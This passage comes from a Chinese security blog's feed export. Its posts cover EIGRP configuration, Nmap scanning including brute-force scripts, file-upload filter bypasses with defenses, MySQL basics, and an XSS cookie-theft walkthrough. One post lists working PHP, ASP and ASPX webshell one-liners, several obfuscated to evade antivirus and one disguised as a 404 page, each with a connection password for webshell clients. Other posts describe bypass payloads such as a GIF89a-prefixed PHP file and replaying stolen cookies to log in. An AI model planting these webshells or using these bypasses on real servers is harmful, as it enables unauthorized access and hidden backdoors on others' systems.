-dly:延迟之和，路由传递方向所有入接口的dly值的累加 EIGRP配置：配置EIGRP： Router(config)#router eigrp 100 //同一个自治系统的eigrp编号要相同Router(config-router)#network 192.168.1.0 //通告直连网络Router(config-router)#network 192.168.1.0 0.0.0.255 //也可加上反掩码Router(config-router)#no auto-summary //禁用自动总结Router(config-router)#passive-interface loopback0 //配置被动接口Router(config)#int f0/0Router(config-if)#ip summary-address eigrp 100 192.168.1.0 255.255.255.0 //EIGRP手动路由汇总 被动接口：被动接口（passive interface）一般应用于优化，比如在我们的拓扑中R2上有一个环回口lo0:2.2.2.2，向lo0口发送EIGRP报文是没必要的，当我们在EIGRP路由进程下启用lo0的被动接口后，R2将不再向lo0发送任何EIGRP报文，但是lo0的路由还是会被R2发送出去。 检验EIGRP： Router#show ip route eigrp //查看路由表Router#show ip protocolsRouter#show ip eigrp interfaceRouter#show ip eigrp neighbors //查看邻居表Router#show ip eigrp topology //查看拓扑表Router#show ip eigrp traffic EIGRP负载均衡：等价负载均衡默认支持4条，不同IOS版本不同 v值计算方法：V&gt;FS/S,结果向上取整 配置方法： Router(config)#router eigrp 100 //进入EIGRP100Router(config-router)#Variance 2 //配置非等价负载均衡，V值为2 EIGRP MD5身份验证：EIGRP支持MD5身份验证，路由器对每个它发送的EIGRP数据包进行自我标识。路由器验证接收到的每个路由更新数据包的来源，每个参与的邻居都必须配置相同的密钥。 配置步骤： 1、创建密钥链，它是一组可能的密钥（密码） 2、对每个密钥分配密钥ID 3、标识密钥 4、指定密钥的有效期（可选） 5、在接口上启用MD5身份验证 6、指定接口使用的密钥链 Router(config)#key chain key1 //进入密钥链配置模式,密钥链名为key1Router(config-keychain)#key 1 //标识密钥并进入密钥ID的配置模式，密钥ID为1Router(config-keychain-key)#key-string 123 //标识密钥字符串（密码）Router(config)#int f0/1 //进入接口Router(config-if)#ip authentication mode eigrp autonomous-system md5 //为EIGRP数据包指定MD5身份验证Router(config-if)#ip authentication key-chain eigrp autonomous-system key1 //使用密钥链中的密钥来启用EIGRP数据包的身份验证]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>路由协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap基本使用命令]]></title>
    <url>%2F2019%2F09%2F23%2FNmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[Nmap基础命令：扫描单个IP：nmap 172.16.13.12 扫描多个IP：nmap 172.16.13.12 172.16.13.13 扫描一个范围的目标地址：nmap 172.16.13.12-15 扫描一个网段的目标地址：nmap 172.16.13.0/24 扫描target.txt中主机列表中的地址：nmap -iL target.txt 扫描除了某一目标之外的其它地址：nmap 172.16.13.0/24 -exclude 172.16.13.62 扫描除了某一文件中的地之外的其它地址：nmap 172.16.13.0/24 -excludefile target.txt 扫描目标地址的某些端口：nmap 172.16.13.62 -p 21,22,23,24 对目标地址进行路由跟踪：nmap -traceroute 172.16.13.12 扫描在线主机：nmap -sP 172.16.13.0/24 目标地址操作系统识别：nmap -O 172.16.13.12 目标地址提供的服务版本：nmap -sV 172.16.13.12 探测目标防火墙状态：nmap -sF -T4 172.16.13.12 Nmap进阶命令：扫描弱口令：nmap -script=auth 172.16.13.12 暴力破解：nmap -script=brute 172.16.13.12 扫描常见漏洞：nmap -script=vuln 172.16.13.12 使用脚本进行应用服务扫描：nmap -script=realvnc-auth-bypass 172.16.13.12 探测局域网服务开放状态：nmap -script=broadcast 172.16.13.12 Whois解析：nmap -script external baidu.com]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞攻击及防御]]></title>
    <url>%2F2019%2F08%2F15%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[前端限制：前端代码：function check()&#123; var filename=document.getElementById(&quot;file&quot;); var str=filename.value.split(&quot;.&quot;); var ext=str[str.length-1]; if(ext==&apos;jpg&apos;||ext==&apos;png&apos;||ext==&apos;jpeg&apos;||ext==&apos;gif&apos;)&#123; return true; &#125;else&#123; alert(&quot;请上传图片格式文件&quot;) return false; &#125; return false; &#125; 在表单中使用onsumbit=check()调用js函数来检查上传文件的扩展名。这种限制实际上没有任何用处，任何攻击者都可以轻而易举的破解。只能用于对于用户完全信任的情况下，很难称之为一种安全措施只能称之是一种防止用户误操作上传的措施。 原理：当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。 绕过方法：1、绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。例如:文件名本来为【evil.jpg】，上传时，用BurpSuite截包后，将数据包中的名字改为【evil.php】(或其它脚本类型)即可。 2、如果是JS脚本检测，在本地浏览器客户端禁用JS即可。可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现。 检查扩展名:就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传在检查扩展名是否合法的时候，有两种策略: 1、黑名单策略，文件扩展名在黑名单中的为不合法： $postfix = end(explode(&apos;.&apos;,&apos;$_POST[&apos;filename&apos;]);if($postfix==&apos;php&apos;||$postfix==&apos;asp&apos;||$postfix==&apos;sh&apos;)&#123; echo &quot;invalid file type&quot;; return;&#125; 2、白名单策略，文件扩展名不在白名单中的均为不合法： $postfix = end(explode(&apos;.&apos;,&apos;$_POST[&apos;filename&apos;]);if($postfix==&apos;jpg&apos;||$postfix==&apos;png&apos;||$postfix==&apos;gif&apos;)&#123; //save the file and do something next&#125; else &#123; echo &quot;invalid file type&quot;; return;&#125; 白名单策略是更加安全的，通过限制上传类型为只有我们接受的类型，可以较好的保证安全，因为黑名单我们可以使用各种方法来进行注入和突破。 原理：当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。 绕过方法：在一些Web server中，存在解析漏洞。 1、老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析。 2、老板本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg。 3、旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行。 4、nginx(0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）。 5、apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的。 检查HTTP Header中的Content-Type：原理：HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改，不过加上一层防护也是可以有一定效果的。 绕过方法：使用各种各样的工具（如burpsuite）强行篡改Header就可以，将Content-Type: application/php改为其他web程序允许的类型。 Content-Type: image/jpg Content-Type: image/png Content-Type: text/plain 常用的MIMETYPE表：text/plain（纯文本） text/html（HTML文档） text/javascript（js代码） application/xhtml+xml（XHTML文档） image/gif（GIF图像） image/jpeg（JPEG图像） image/png（PNG图像） video/mpeg（MPEG动画） application/octet-stream（二进制数据） application/pdf（PDF文档） application/(编程语言) 该种语言的代码 application/msword（Microsoft Word文件） message/rfc822（RFC 822形式） multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示） application/x-www-form-urlencoded（POST方法提交的表单） multipart/form-data（POST提交时伴随文件上传的表单） 分析头文件内容检查文件类型：与检查扩展名不同，还有一种检查类型的方式是使用对于文件内容的验证机制，这种方法利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。 在正常情况下，通过判断前10个字节，基本上就能判断出一个文件的真实类型。可以通过比如php的exif_imagetype()函数，一个通过这种方法来过滤的示例代码如下： if (! exif_imagetype($_FILES[&apos;uploadedfile&apos;][&apos;tmp_name&apos;])) &#123; echo &quot;File is not an image&quot;; return; &#125; 也可以自己编写函数来进行识别，图片文件通常有称作幻数的头字节，我们来看一下几种图片文件的幻数：（注意！下面是二进制而不是文本格式的数据） JPG: FF D8 FF E0 00 10 4A 46 49 46 GIF: 47 49 46 38 39 61(相当于文本的GIF89a) PNG: 89 50 4E 47 绕过方法：给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符） GIF89a&lt;?phpdo_something();?&gt; 如果是其他类型的二进制文件，也有响应的头字节，如下表： 限制Web Server对于特定类型文件的行为:导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般来说，用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 ./upload/ 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。 大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以Apache为例： 在默认情况下，对与 .php文件Apache会当作代码来执行，对于 html,css,js文件，则会直接由HTTP Response交给客户端程序对于一些资源文件，比如txt，doc，rar等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码。 因此可以使用服务器程序的接口来进行限制。 以Apache为例,我们可以利用 .htaccess 文件机制来对web server行为进行限制。 禁止脚本执行有多种方式可以实现，而且分别有不同的效果： 1、指定特定扩展名的文件的处理方式,原理是指定Response的Content-Type可以加上如下几行 AddType text/plain .pl .py .php 这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type。 2、如果要完全禁止特定扩展名的文件被访问，用下面的几行 Options -ExecCGIAddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别 在这种情况下，以上几种类型的文件被访问的时候，会返回403 Forbidden的错误。 3、也可以强制web服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型。 &lt;FilesMatch &quot;\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$&quot;&gt;ForceType text/plain&lt;/FilesMatch&gt; 符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型 4、只允许访问特定类型的文件 &lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt;order deny,allowdeny from all&lt;/Files&gt; 在一个上传图片的文件夹下面，就可以加上这段代码，使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问。 这又是一个白名单的处理方案，永远记得，白名单是最有保障的安全措施。 绕过方法：可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。 文件系统00截断：原理：在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。 绕过方法：通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。 其它方式—绕过：原理：部分程序员的思维不严谨，并使用逻辑不完善的上传文件合法性检测手段，导致可以找到方式绕过其检测方式。 绕过方法：1、后缀名大小写绕过用于只将小写的脚本后缀名(如php)过滤掉的场合；例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】 2、双写后缀名绕过用于只将文件后缀名过滤掉的场合，例如”php”字符串过滤的；例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个”php”字符串”后，开头的’p’和结尾的’hp’就组合又形成了【php】。 3、特殊后缀名绕过用于检测文件合法性的脚本有问题的场合；例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。 文件上传漏洞防御：首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径。 其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法得到Web容器解释这个脚本，那么也不能称之为漏洞。 最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。 防范文件上传漏洞常见的几种方法： 1、文件上传的目录设置为不可执行只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。 2、判断文件类型在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。 3、使用随机数改写文件名和文件路径文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。 4、单独设置文件服务器的域名由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。 系统开发阶段的防御： 系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。 系统运行阶段的防御： 系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。 参考（侵删）：https://www.jianshu.com/p/5ebba0482980]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞简介]]></title>
    <url>%2F2019%2F08%2F15%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[文件上传漏洞概念：文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。 Webshell简介：WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员不容易发现入侵痕迹。攻击者可以将WebShell隐藏在正常文件中并修改文件时间增强隐蔽性，也可以采用一些函数对WebShell进行编码或者拼接以规避检测。除此之外，通过一句话木马的小马来提交功能更强大的大马可以更容易通过应用本身的检测。 &lt;?php eval($_POST[a]); ?&gt;就是一个最常见最原始的小马。 文件上传漏洞形成原因：1 、对于上传文件的后缀名（扩展名）没有做较为严格的限制。 2 、对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查。 3 、权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）。 4、 对于web server对于上传文件或者指定目录的行为没有做限制。 文件上传漏洞原理：在 WEB 中进行文件上传的原理是通过将表单设为 multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上。 漏洞导致的后果：1、上传文件是web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。 2、上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其它通过类似方式控制策略文件的情况类似）。 3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。 4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺骗。 除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过“本地文件包含漏洞（Local File Include）”执行此脚本等等。 参考（侵删）：https://www.jianshu.com/p/5ebba0482980]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一句话木马源代码]]></title>
    <url>%2F2019%2F08%2F09%2F%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%BA%90%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[PHP一句话：1、普通一句话：&lt;?php @eval($_POST[123456]); ?&gt; *post后面中括号里面的内容是使用菜刀或蚁剑连接时的密码 2、防爆破一句话：&lt;?php substr(md5($_REQUEST[&#39;x&#39;]),28)==&#39;6862&#39;&amp;&amp;eval($_REQUEST[&#39;password&#39;]); ?&gt; *菜刀地址http://192.168.64.137/x.php?x=myh0st 3、过狗一句话:&lt;?php ($_=@$_GET[s]).@$_($_POST[hihack]) ?&gt; //菜刀地址 http://localhost/1.php?s=assert &lt;php $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; $a($_POST[hihack]); ?&gt; 4、404隐藏的一句话：​ &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;​ &lt;html&gt;&lt;head&gt;​ &lt;title&gt;404 Not Found&lt;/title&gt;​ &lt;/head&gt;&lt;body&gt;​ &lt;h1&gt;Not Found&lt;/h1&gt;​ &lt;p&gt;The requested URL /error.php was not found on this server. &lt;/p&gt;​ &lt;/body&gt;&lt;/html&gt;​ &lt;?php​ @preg_replace(&quot;/[checksql]/e&quot;,$_POST[&#39;hihack&#39;],&quot;saft&quot;);​ ?&gt; ​ 菜刀连接时在配置栏添加： ​ &lt;O&gt;date=@eval($_POST[paxmac]);&lt;/O&gt; 5、不用问号(?)的一句话：&lt;script language=&quot;php&quot;&gt;eval ($_POST[hihack]);&lt;/script&gt; 6、躲避检测：&lt;?php assert($_REQUEST[&quot;hihack&quot;]);?&gt; 7、变形一句话后门： 访问该网页，然后菜刀连接：/myh0st.php 密码：hihack ASP一句话：1、普通一句话：&lt;%eval request(&quot;hihack&quot;)%&gt;或&lt;%execute(request(&quot;hihack&quot;))%&gt; 2、unicode编码的access木马 ：向access数据库插入 ┼攠數畣整爠煥敵瑳∨≡┩&gt; 编码前：&lt;% execute request(&quot;a&quot;)%&gt; 然后备份出webshell，密码a 3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）：插入：&quot;%&gt;&lt;% bbbb=request(&quot;aaaa&quot;)%&gt;&lt;%eval(bbbb)%&gt;&lt;%&#39; 访问报错，获取到配置文件的地址，然后连接，密码aaaa 4、不用%的一句话：&lt;script language=VBScript runat=server&gt;execute request(&quot;hihack&quot;)&lt;/script&gt; 5、不用双引号(“)的一句话：&lt;%eval request(chr(35))%&gt; 密码：# ASPX一句话：1、普通一句话：​ &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“hihack”],”unsafe”);%&gt; 2、免杀一句话：&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;&lt;%var PAY:String=Request[“\x61\x62\x63\x64”];eval(PAY,”\x75\x6E\x73\x61”+”\x66\x65”);%&gt;]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL特殊数据库]]></title>
    <url>%2F2019%2F08%2F09%2FMysql%E7%89%B9%E6%AE%8A%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[information_schema简介：在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。 information_schema数据库表说明:SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。 TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 SCHEMA_PRIVILEGES表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 TABLE_PRIVILEGES表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 COLUMN_PRIVILEGES表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 CHARACTER_SETS表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 COLLATIONS表：提供了关于各字符集的对照信息。 COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。 TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。 KEY_COLUMN_USAGE表：描述了具有约束的键列。 ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。 VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。 TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>数据库基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL基础命令]]></title>
    <url>%2F2019%2F08%2F09%2FMySQL%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[MySql数据库操作基础#启动mysql服务器：net start mysql #关闭musql服务器：net stop mysql #显示数据库：show databases； #创建数据库:create database test; #删除数据库: drop database test; #使用该数据库:use test; #显示数据库中的表:show tables; #创建表: ​ create table student( ​ id int auto_increment primary key, ​ name varchar(50), ​ sex varchar(20), ​ date varchar(50), ​ content varchar(10), ​ )default charset=utf8; #删除表:drop table student; #查看表的结构:describe student; 可以简写为desc student; #插入数据 ​ insert into student values(null,’aa’,’男’,’1988-10-2’,’……’); ​ insert into student values(null,’bb’,’女’,’1889-03-6’,’……’); ​ insert into student values(null,’cc’,’男’,’1889-08-8’,’……’); ​ insert into student values(null,’dd’,’女’,’1889-12-8’,’……’); ​ insert into student values(null,’ee’,’女’,’1889-09-6’,’……’); ​ insert into student values(null,’ff’,’null’,’1889-09-6’,’……’); #查询表中的数据:select * from student;select id,name from student; #修改某一条数据: update student set sex=’男’ where id=4; #删除数据:delete from student where id=5; #and 且: ​ select * from student where date&gt;’1988’ and date&lt;’1995’; #or 或: ​ select * from student where date&lt;’1988’ or date&gt;’1995’; #between: ​ select * from student where date between ‘1988’ and ‘1995’; #in 查询制定集合内的数据: ​ select * from student where id in (1,3,5); #排序 :升序(asc)和降序(desc)： ​ select * from student order by id asc; #分组查询 #聚合函数: ​ select max(id),name,sex from student group by sex; ​ select min(date) from student; ​ select avg(id) as ‘求平均’ from student; ​ select count(*) from student; #统计表中总数 ​ select count(sex) from student; #统计表中性别总数 ​ select sum(id) from student; #id的和 #查询第i条以后到第j条的数据(不包括第i条): ​ select * from student limit 2,5; #显示3-5条数据 #修改数据: ​ update c set age=66 where id=2; ​ update c set name=’花花’,age=21,sex=’女’ where id=2delete from c where age=21; #常用查询语句: ​ select name,age ,id from c ​ select * from c where age&gt;40 and age&lt;60; #and ​ select * from c where age&lt;40 or age&lt;60; #or ​ select * from c where age between 40 and 60 ;#between ​ select * from c where age in (30,48); #in 查询指定集合内的数据 ​ select * from c order by age desc; #order by （升序,降序） #分组查询: ​ select name,max(age) from c group by sex; #按性别查最大年龄 #聚合函数: ​ select min(age) from c; ​ select avg(age) as ‘平均年龄 ‘ from c; ​ select count(*) from c; #统计表中数据总数 ​ select sum(age) from c; #修改表的名字: ​ alter table tbl_name rename to new_name ​ alter table c rename to a; #表结构修改: ​ create table test( ​ id int not null auto_increment primary key, #设定主键 ​ name varchar(20) not null default ‘NoName’, #设定默认值 ​ department_id int not null, ​ position_id int not null, ​ unique (department_id,position_id) #设定唯一值 ​ ); #向表中增加一个字段(列): ​ alter table tablename add columnname type; ​ alter table tablename add(columnname type); ​ alter table test add columnname varchar(20); #修改表中某个字段的名字: ​ alter table tablename change columnname newcolumnname type; ​ alter table test change name uname varchar(50); #表position 增加列: ​ testalter table position add(test char(10)); #表position 修改列test: ​ alter table position modify test char(20) not null; #表position 修改列test默认值: ​ alter table position alter test set default ‘system’; #表position 去掉test 默认值: ​ alter table position alter test drop default; #表position 去掉列test: ​ alter table position drop column test; #表depart_pos 删除主键: ​ alter table depart_pos drop primary key; #表depart_pos 增加主键: ​ alter table depart_pos add primary key PK_depart_pos(department_id,position_id); #用文本方式将数据装入数据库表中: ​ load data local infile “D:/mysql.txt” into table MYTABLE; #导入.sql文件: ​ source d:/mysql.sql; #或者 /. d:/mysql.sql;]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>数据库基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS应用]]></title>
    <url>%2F2019%2F08%2F09%2FXSS%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[搭建在线平台：网址：https://xsshs.cn/xss.php 注册并登录…… 生成项目：1、创建项目：登陆成功后，在主界面点击找到我的项目，并点击创建 2、设置项目名称和描述： 3、选择模块: 4、选择攻击代码并点击完成： 攻击目标网站：1、将上面复制的攻击代码粘贴到输入框，并提交 2、查看创建的项目，发现有一条新的内容 3、点击展开，查看有用信息 这里已经拿到了cookie 通过cookie登录网站：1、利用burp对登陆页面进行抓包 2、将盗取到的cookie替换包内的cookie 3、放包，登陆成功]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS进阶]]></title>
    <url>%2F2019%2F08%2F09%2FXSS%E8%BF%9B%E9%98%B6%2F</url>
